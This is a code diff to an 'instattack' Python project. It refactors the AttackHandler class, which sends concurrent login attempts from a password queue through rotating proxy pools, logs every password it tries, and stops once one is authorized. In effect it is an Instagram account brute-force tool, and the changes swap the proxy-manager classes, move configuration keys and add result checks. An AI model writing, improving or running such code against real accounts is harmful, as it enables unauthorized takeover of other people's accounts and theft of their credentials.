@@ -7,9 +7,8 @@ from instattack.lib.utils import percentage, limit_as_completed, cancel_remainin
 
 from instattack.app.exceptions import NoPasswordsError
 from instattack.app.models import InstagramResults
-from instattack.app.proxies import AdvancedProxyPool
+from instattack.app.proxies import ManagedProxyPool, SmartProxyManager
 
-from .proxies import BrokeredProxyHandler
 from .login import AbstractLoginHandler
 
 """
@@ -50,28 +49,29 @@ log = logger.get(__name__, 'Attack Handler')
 class AttackHandler(AbstractLoginHandler):
 
     __name__ = 'Attack Handler'
-    __proxy_handler__ = BrokeredProxyHandler
-    __proxy_pool__ = AdvancedProxyPool
+    __proxy_manager__ = SmartProxyManager
+    __proxy_pool__ = ManagedProxyPool
 
     def __init__(self, *args, **kwargs):
         super(AttackHandler, self).__init__(*args, **kwargs)
 
         self.passwords = asyncio.Queue()
         self.num_passwords = 0
+        self.stop_event = asyncio.Event()
 
     async def attack(self, limit=None):
         try:
             results = await asyncio.gather(
                 self._attack(limit=limit),
-                self.proxy_handler.run(),
+                self.proxy_manager.start(),
             )
         except Exception as e:
             await self.finish()
-            await self.proxy_handler.stop()
+            await self.proxy_manager.stop()
             raise e
         else:
             # We might not need to stop proxy handler?
-            await self.proxy_handler.stop()
+            await self.proxy_manager.stop()
             return results[0]
 
     async def _attack(self, limit=None):
@@ -132,19 +132,21 @@ class AttackHandler(AbstractLoginHandler):
             if fut.exception():
                 return True
 
-            result, num_attempts = fut.result()
-            if result.conclusive:
-                self.num_completed += 1
-                results.add(result)
+            if fut.result():
+                result, num_attempts = fut.result()
+                if result.conclusive:
+                    self.num_completed += 1
+                    results.add(result)
 
-                pct = percentage(self.num_completed, self.num_passwords)
-                log.info(f'{pct}', extra={
-                    'other': f'Num Attempts: {num_attempts}',
-                    'password': result.password,
-                })
-                if result.authorized:
-                    self.stop_event.set()
-                    asyncio.create_task(cancel_remaining_tasks(futures=pending))
+                    pct = percentage(self.num_completed, self.num_passwords)
+                    log.info(f'{pct}', extra={
+                        'other': f'Num Attempts: {num_attempts}',
+                        'password': result.password,
+                    })
+
+                    if result.authorized:
+                        self.stop_event.set()
+                        asyncio.create_task(cancel_remaining_tasks(futures=pending))
 
         async with aiohttp.ClientSession(
             connector=self.connector,
@@ -153,16 +155,21 @@ class AttackHandler(AbstractLoginHandler):
         ) as session:
             async for fut, pending, num_tries in limit_as_completed(
                 coros=self.generate_attempts_for_passwords(session),
-                batch_size=config['passwords']['batch_size'],
+                batch_size=config['login']['passwords']['passwords_batch_size'],
                 done_callback=done_callback,
                 stop_event=self.stop_event
             ):
                 if fut.exception():
                     raise fut.exception()
 
-                result, num_attempts = fut.result()
-                if result.conclusive:
-                    await self.handle_attempt(result)
+                if fut.result():
+                    result = fut.result()[0]
+                    if result.conclusive:
+                        await self.handle_attempt(result)
+
+                        # Throws Asyncio.CancelledError - But we have it in the
+                        # callback method.
+                        # await cancel_remaining_tasks(futures=pending)
 
         await asyncio.sleep(0)
         return results
